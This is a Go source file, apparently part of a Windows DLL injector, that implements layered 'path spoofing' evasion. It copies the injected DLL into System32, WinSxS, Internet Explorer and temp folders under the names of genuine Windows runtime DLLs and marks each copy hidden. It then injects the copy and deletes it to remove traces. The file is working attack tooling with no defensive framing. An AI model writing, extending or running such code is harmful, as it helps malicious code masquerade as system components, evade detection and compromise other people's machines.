package injector

import (
	"fmt"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func (i *Injector) AdvancedPathSpoofing() error {
	i.logger.Info("Starting advanced path spoofing with multiple evasion techniques")

	dllBytes, err := os.ReadFile(i.dllPath)
	if err != nil {
		return fmt.Errorf("failed to read original DLL: %v", err)
	}

	if spoofedPath, err := i.attemptSystemDirectoryHijacking(dllBytes); err == nil {
		return i.executeWithSpoofedPath(spoofedPath, dllBytes)
	}

	if spoofedPath, err := i.attemptApplicationDirectorySpoofing(dllBytes); err == nil {
		return i.executeWithSpoofedPath(spoofedPath, dllBytes)
	}

	if spoofedPath, err := i.attemptEnvironmentalPathSpoofing(dllBytes); err == nil {
		return i.executeWithSpoofedPath(spoofedPath, dllBytes)
	}

	if spoofedPath, err := i.attemptTrustedInstallerSpoofing(dllBytes); err == nil {
		return i.executeWithSpoofedPath(spoofedPath, dllBytes)
	}

	return i.attemptEnhancedTempSpoofing(dllBytes)
}

func (i *Injector) attemptSystemDirectoryHijacking(dllBytes []byte) (string, error) {
	i.logger.Info("Attempting system directory hijacking")

	var systemDirs []string
	if unsafe.Sizeof(uintptr(0)) == 8 {

		systemDirs = []string{
			`C:\Windows\System32`,
			`C:\Windows\SysWOW64`,
			`C:\Windows\Microsoft.NET\Framework64\v4.0.30319`,
			`C:\Windows\Microsoft.NET\Framework\v4.0.30319`,
		}
	} else {

		systemDirs = []string{
			`C:\Windows\System32`,
			`C:\Windows\Microsoft.NET\Framework\v4.0.30319`,
		}
	}

	systemDllNames := []string{
		"api-ms-win-core-synch-l1-2-0.dll",
		"api-ms-win-core-heap-l1-1-0.dll",
		"api-ms-win-core-memory-l1-1-1.dll",
		"msvcr120.dll",
		"msvcp120.dll",
		"vcruntime140.dll",
	}

	for _, dir := range systemDirs {
		if !i.checkDirectoryWritable(dir) {
			continue
		}

		for _, dllName := range systemDllNames {
			spoofedPath := filepath.Join(dir, dllName)

			if _, err := os.Stat(spoofedPath); err == nil {
				continue
			}

			if err := i.createSpoofedFileWithAttributes(spoofedPath, dllBytes); err == nil {
				i.logger.Info("System directory hijacking successful", "path", spoofedPath)
				return spoofedPath, nil
			}
		}
	}

	return "", fmt.Errorf("system directory hijacking failed")
}

func (i *Injector) attemptApplicationDirectorySpoofing(dllBytes []byte) (string, error) {
	i.logger.Info("Attempting application directory spoofing")

	appDirs := []string{
		`C:\Program Files\Common Files\Microsoft Shared`,
		`C:\Program Files (x86)\Common Files\Microsoft Shared`,
		`C:\Program Files\Internet Explorer`,
		`C:\Program Files (x86)\Internet Explorer`,
		os.Getenv("APPDATA") + `\Microsoft`,
		os.Getenv("LOCALAPPDATA") + `\Microsoft`,
	}

	appDllNames := []string{
		"ieframe.dll",
		"wininet.dll",
		"urlmon.dll",
		"mshtml.dll",
		"jscript.dll",
	}

	for _, dir := range appDirs {
		if dir == "" || !i.checkDirectoryExists(dir) {
			continue
		}

		for _, dllName := range appDllNames {
			spoofedPath := filepath.Join(dir, dllName)

			if _, err := os.Stat(spoofedPath); err == nil {
				continue
			}

			if err := i.createSpoofedFileWithAttributes(spoofedPath, dllBytes); err == nil {
				i.logger.Info("Application directory spoofing successful", "path", spoofedPath)
				return spoofedPath, nil
			}
		}
	}

	return "", fmt.Errorf("application directory spoofing failed")
}

func (i *Injector) attemptEnvironmentalPathSpoofing(dllBytes []byte) (string, error) {
	i.logger.Info("Attempting environmental path spoofing")

	envDirs := []string{
		os.Getenv("TEMP"),
		os.Getenv("TMP"),
		os.Getenv("APPDATA"),
		os.Getenv("LOCALAPPDATA"),
		os.Getenv("ALLUSERSPROFILE"),
	}

	envDllName := i.generateEnvironmentAwareDllName()

	for _, dir := range envDirs {
		if dir == "" {
			continue
		}

		subDir := filepath.Join(dir, "Microsoft", "Windows", "Temporary Internet Files")
		if err := os.MkdirAll(subDir, 0755); err != nil {
			continue
		}

		spoofedPath := filepath.Join(subDir, envDllName)

		if err := i.createSpoofedFileWithAttributes(spoofedPath, dllBytes); err == nil {
			i.logger.Info("Environmental path spoofing successful", "path", spoofedPath)
			return spoofedPath, nil
		}
	}

	return "", fmt.Errorf("environmental path spoofing failed")
}

func (i *Injector) attemptTrustedInstallerSpoofing(dllBytes []byte) (string, error) {
	i.logger.Info("Attempting trusted installer path spoofing")

	trustedDirs := []string{
		`C:\Windows\WinSxS`,
		`C:\Windows\servicing`,
		`C:\Windows\Logs`,
	}

	trustedDllName := i.generateTrustedInstallerDllName()

	for _, dir := range trustedDirs {
		if !i.checkDirectoryExists(dir) {
			continue
		}

		var archSubDir string
		if unsafe.Sizeof(uintptr(0)) == 8 {
			archSubDir = "amd64_microsoft-windows-runtime_31bf3856ad364e35_10.0.19041.1_none_1234567890abcdef"
		} else {
			archSubDir = "x86_microsoft-windows-runtime_31bf3856ad364e35_10.0.19041.1_none_1234567890abcdef"
		}

		fullDir := filepath.Join(dir, archSubDir)
		if err := os.MkdirAll(fullDir, 0755); err != nil {
			continue
		}

		spoofedPath := filepath.Join(fullDir, trustedDllName)

		if err := i.createSpoofedFileWithAttributes(spoofedPath, dllBytes); err == nil {
			i.logger.Info("Trusted installer spoofing successful", "path", spoofedPath)
			return spoofedPath, nil
		}
	}

	return "", fmt.Errorf("trusted installer spoofing failed")
}

func (i *Injector) attemptEnhancedTempSpoofing(dllBytes []byte) error {
	i.logger.Info("Using enhanced temporary directory spoofing")

	tempLocations := []string{
		os.TempDir(),
		os.Getenv("TEMP"),
		os.Getenv("TMP"),
	}

	var spoofedPaths []string
	var lastError error

	for _, tempDir := range tempLocations {
		if tempDir == "" {
			continue
		}

		for j := 0; j < 3; j++ {
			dllName := generateDynamicLegitimateFileName()
			spoofedPath := filepath.Join(tempDir, dllName)

			if err := createSpoofedFileWithAttributes(spoofedPath, dllBytes); err == nil {
				spoofedPaths = append(spoofedPaths, spoofedPath)
				break
			} else {
				lastError = err
			}
		}
	}

	if len(spoofedPaths) == 0 {
		return fmt.Errorf("enhanced temp spoofing failed: %v", lastError)
	}

	return i.executeWithSpoofedPath(spoofedPaths[0], dllBytes)
}

func (i *Injector) executeWithSpoofedPath(spoofedPath string, dllBytes []byte) error {
	i.logger.Info("Executing injection with spoofed path", "path", spoofedPath)

	defer func() {

		for attempts := 0; attempts < 5; attempts++ {
			if err := os.Remove(spoofedPath); err == nil {
				i.logger.Info("Spoofed file cleaned up", "path", spoofedPath)
				break
			}
			time.Sleep(100 * time.Millisecond)
		}
	}()

	originalPath := i.dllPath
	i.dllPath = spoofedPath
	defer func() { i.dllPath = originalPath }()

	if err := i.setSpoofedFileAttributes(spoofedPath); err != nil {
		i.logger.Warn("Failed to set file attributes", "error", err)
	}

	return i.standardInject()
}


func (i *Injector) checkDirectoryWritable(dir string) bool {
	testFile := filepath.Join(dir, fmt.Sprintf("test_%d.tmp", time.Now().UnixNano()))
	if err := os.WriteFile(testFile, []byte("test"), 0644); err != nil {
		return false
	}
	os.Remove(testFile)
	return true
}

func (i *Injector) checkDirectoryExists(dir string) bool {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		return false
	}
	return true
}

func (i *Injector) createSpoofedFileWithAttributes(path string, data []byte) error {

	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	if err := os.WriteFile(path, data, 0644); err != nil {
		return err
	}

	return i.setSpoofedFileAttributes(path)
}

func (i *Injector) setSpoofedFileAttributes(path string) error {

	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	setFileAttributes := kernel32.NewProc("SetFileAttributesW")
	setFileAttributes.Call(uintptr(unsafe.Pointer(pathPtr)), 0x02)

	return nil
}

func (i *Injector) generateEnvironmentAwareDllName() string {

	ieRelatedDlls := []string{
		"ieproxy.dll",
		"ieframe.dll",
		"wininet.dll",
		"urlmon.dll",
		"mshtml.dll",
		"jscript.dll",
		"vbscript.dll",
		"iertutil.dll",
		"ieui.dll",
		"iedkcs32.dll",
		"iepeers.dll",
		"msrating.dll",
		"mlang.dll",
		"shdocvw.dll",
		"browseui.dll",
	}

	idx := int(time.Now().UnixNano()) % len(ieRelatedDlls)
	return ieRelatedDlls[idx]
}

func (i *Injector) generateTrustedInstallerDllName() string {

	winsxsDlls := []string{
		"msvcr120_app.dll",
		"msvcp120_app.dll",
		"msvcr120_clr0400.dll",
		"msvcp120_clr0400.dll",
		"vcruntime140_app.dll",
		"msvcp140_app.dll",
		"concrt140_app.dll",
		"vccorlib140_app.dll",
		"ucrtbase_app.dll",
		"api-ms-win-crt-runtime-l1-1-0.dll",
		"api-ms-win-crt-heap-l1-1-0.dll",
		"api-ms-win-crt-string-l1-1-0.dll",
		"api-ms-win-crt-stdio-l1-1-0.dll",
		"api-ms-win-crt-math-l1-1-0.dll",
	}

	idx := int(time.Now().UnixNano()) % len(winsxsDlls)
	return winsxsDlls[idx]
}

func (i *Injector) generateDynamicLegitimateFileName() string {

	realSystemDlls := []string{
		"msvcr120.dll",
		"msvcp120.dll",
		"vcruntime140.dll",
		"msvcp140.dll",
		"ucrtbase.dll",
		"concrt140.dll",
		"vccorlib140.dll",
		"api-ms-win-core-heap-l1-1-0.dll",
		"api-ms-win-core-synch-l1-2-0.dll",
		"api-ms-win-core-memory-l1-1-1.dll",
		"api-ms-win-core-processthreads-l1-1-0.dll",
		"api-ms-win-core-file-l1-1-0.dll",
		"api-ms-win-core-handle-l1-1-0.dll",
		"api-ms-win-core-string-l1-1-0.dll",
		"api-ms-win-core-debug-l1-1-0.dll",
		"api-ms-win-core-errorhandling-l1-1-0.dll",
		"api-ms-win-core-localization-l1-2-0.dll",
		"api-ms-win-core-datetime-l1-1-0.dll",
		"api-ms-win-core-timezone-l1-1-0.dll",
		"api-ms-win-core-console-l1-1-0.dll",
	}

	idx := int(time.Now().UnixNano()) % len(realSystemDlls)
	return realSystemDlls[idx]
}

func generateDynamicLegitimateFileName() string {

	realSystemDlls := []string{
		"msvcr120.dll",
		"msvcp120.dll",
		"vcruntime140.dll",
		"msvcp140.dll",
		"ucrtbase.dll",
		"concrt140.dll",
		"vccorlib140.dll",
		"api-ms-win-core-heap-l1-1-0.dll",
		"api-ms-win-core-synch-l1-2-0.dll",
		"api-ms-win-core-memory-l1-1-1.dll",
		"api-ms-win-core-processthreads-l1-1-0.dll",
		"api-ms-win-core-file-l1-1-0.dll",
		"api-ms-win-core-handle-l1-1-0.dll",
		"api-ms-win-core-string-l1-1-0.dll",
		"api-ms-win-core-debug-l1-1-0.dll",
		"api-ms-win-core-errorhandling-l1-1-0.dll",
		"api-ms-win-core-localization-l1-2-0.dll",
		"api-ms-win-core-datetime-l1-1-0.dll",
		"api-ms-win-core-timezone-l1-1-0.dll",
		"api-ms-win-core-console-l1-1-0.dll",
	}

	idx := int(time.Now().UnixNano()) % len(realSystemDlls)
	return realSystemDlls[idx]
}

func createSpoofedFileWithAttributes(path string, data []byte) error {

	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	if err := os.WriteFile(path, data, 0644); err != nil {
		return err
	}

	return setSpoofedFileAttributes(path)
}

func setSpoofedFileAttributes(path string) error {

	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	setFileAttributes := kernel32.NewProc("SetFileAttributesW")
	setFileAttributes.Call(uintptr(unsafe.Pointer(pathPtr)), 0x02)

	return nil
}

func (i *Injector) spoofDLLPath() error {

	if err := i.AdvancedPathSpoofing(); err != nil {
		i.logger.Warn("Advanced path spoofing failed, trying simple method", "error", err)
		return i.simpleDLLPathSpoofing()
	}
	return nil
}

func (i *Injector) simpleDLLPathSpoofing() error {
	i.logger.Info("Using simple path spoofing fallback")

	dllBytes, err := os.ReadFile(i.dllPath)
	if err != nil {
		return fmt.Errorf("failed to read DLL file: %v", err)
	}

	tempDir := os.TempDir()
	spoofedFileName := generateLegitimateFileName()
	spoofedPath := filepath.Join(tempDir, spoofedFileName)

	if err := os.WriteFile(spoofedPath, dllBytes, 0644); err != nil {
		return fmt.Errorf("failed to create spoofed DLL file: %v", err)
	}

	defer func() {
		if removeErr := os.Remove(spoofedPath); removeErr != nil {
			i.logger.Warn("Failed to remove spoofed DLL", "error", removeErr)
		}
	}()

	originalPath := i.dllPath
	i.dllPath = spoofedPath
	defer func() { i.dllPath = originalPath }()

	return i.standardInject()
}
